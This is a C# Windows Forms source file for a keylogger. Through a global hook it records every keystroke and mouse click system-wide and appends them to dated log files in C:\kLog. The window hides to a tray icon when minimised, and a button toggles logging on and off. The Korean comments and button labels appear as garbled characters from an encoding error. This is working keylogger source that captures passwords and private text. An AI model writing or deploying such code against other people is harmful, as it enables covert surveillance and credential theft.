using System.Text;

using Gaten.Net.Windows.Forms;

namespace Gaten.Data.KeyLogger
{
    public partial class MainForm : Form
    {
        UserActivityHook hook;
        Thread keyLogThread;
        bool On = true;
        string log;

        public MainForm()
        {
            InitializeComponent();
        }

        private void MainForm_Load(object sender, EventArgs e)
        {
            hook = new UserActivityHook();
            keyLogThread = new Thread(new ThreadStart(keyLogger));
            keyLogThread.Start();
        }

        private void StartButton_Click(object sender, EventArgs e)
        {
            // Ű�ΰ� �������� ���¸� OFF�� �ϰ�, ��ư ����
            if (On)
            {
                On = false;
                startButton.ForeColor = Color.Black;
                startButton.Text = "����";
                trayIcon.Text = "���� ����";
            }
            // Ű�ΰ� �������� ���¸� ON���� �ϰ�, ��ư ����
            else
            {
                On = true;
                startButton.ForeColor = Color.Red;
                startButton.Text = "����";
                trayIcon.Text = "���� ��";
            }


        }

        void SaveLog()
        {
            // �α� ������ ��¥���� �����ϱ� ���� ���� ��¥�� ����
            string today = DateTime.Now.ToString("yyyy-MM-dd");
            string fileName = $@"C:\kLog\{today}log.txt";

            if (!Directory.Exists(@"C:\kLog"))
            {
                Directory.CreateDirectory(@"C:\kLog");
            }

            File.AppendAllLines(fileName, new List<string> { DateTime.Now.ToString("yyyy-MM-dd HH:mm") + " " + log }, Encoding.UTF8);

            // ���� �� �α״� ���
            log = string.Empty;
        }

        void keyLogger()
        {
            // ���콺 ��ŷ
            hook.OnMouseActivity += (sender, e) =>
            {
                if (On)
                {
                    // Ŭ�� �̺�Ʈ�� �߻��ϸ�
                    if (e.Button != MouseButtons.None)
                    {
                        log += $" {e.Button}({e.X},{e.Y})";
                    }
                }
            };

            //Ű���� ��ŷ
            hook.KeyUp += (sender, e) =>
            {
                if (On)
                {
                    log += " " + KeysString(e.KeyCode.ToString());
                }
            };
        }

        public string KeysString(string keyString)
        {
            string toString = string.Empty;
            switch (keyString)
            {
                case "Capital": toString = "CapsLock"; break;
                case "D0": toString = "0"; break;
                case "D1": toString = "1"; break;
                case "D2": toString = "2"; break;
                case "D3": toString = "3"; break;
                case "D4": toString = "4"; break;
                case "D5": toString = "5"; break;
                case "D6": toString = "6"; break;
                case "D7": toString = "7"; break;
                case "D8": toString = "8"; break;
                case "D9": toString = "9"; break;
                case "Add": toString = "+"; break;
                case "Subtract": toString = "-"; break;
                case "Multiply": toString = "*"; break;
                case "Divide": toString = "/"; break;
                case "Up": toString = "��"; break;
                case "Down": toString = "��"; break;
                case "Left": toString = "��"; break;
                case "Right": toString = "��"; break;
                case "Escape": toString = "ESC"; break;
                case "Oemtilde": toString = "`"; break;
                case "OemMinus": toString = "-"; break;
                case "Oemplus": toString = "="; break;
                case "Oem5": toString = "\\"; break;
                case "Next": toString = "PageDown"; break;
                case "OemOpenBrackets": toString = "["; break;
                case "Oem6": toString = "]"; break;
                case "Oem1": toString = ";"; break;
                case "Oem7": toString = "'"; break;
                case "Oemcomma": toString = ","; break;
                case "OemPeriod": toString = "."; break;
                case "OemQuestion": toString = "/"; break;
                case "Return": toString = "Enter"; break;
                case "Scroll": toString = "ScrollLock"; break;
                case "LWin": toString = "Window"; break;
                case "HanjaMode": toString = "Hanja"; break;
                case "KanaMode": toString = "Kana"; break;
                case "Decimal": toString = "."; break;
                case "NumPad0": toString = "N0"; break;
                case "NumPad1": toString = "N1"; break;
                case "NumPad2": toString = "N2"; break;
                case "NumPad3": toString = "N3"; break;
                case "NumPad4": toString = "N4"; break;
                case "NumPad5": toString = "N5"; break;
                case "NumPad6": toString = "N6"; break;
                case "NumPad7": toString = "N7"; break;
                case "NumPad8": toString = "N8"; break;
                case "NumPad9": toString = "N9"; break;
                default: toString = keyString; break;
            }
            return toString;
        }

        private void MainForm_FormClosed(object sender, FormClosedEventArgs e)
        {
            // ���� ��
            SaveLog();

            // Ÿ�̸� ����
            saveTimer.Stop();

            // ������ ����
            keyLogThread.Join();
        }

        private void SaveTimer_Tick(object sender, EventArgs e)
        {
            // 1�и��� �ڵ� ����
            if (DateTime.Now.Second == 0)
            {
                SaveLog();
            }
        }

        private void MainForm_Resize(object sender, EventArgs e)
        {
            if (WindowState == FormWindowState.Minimized)
            {
                Visible = false;
                ShowIcon = false;
                trayIcon.Visible = true;
            }
        }

        private void TrayIcon_MouseDoubleClick(object sender, MouseEventArgs e)
        {
            Visible = true;
            ShowIcon = true;
            trayIcon.Visible = false;
            WindowState = FormWindowState.Normal;
        }
    }
}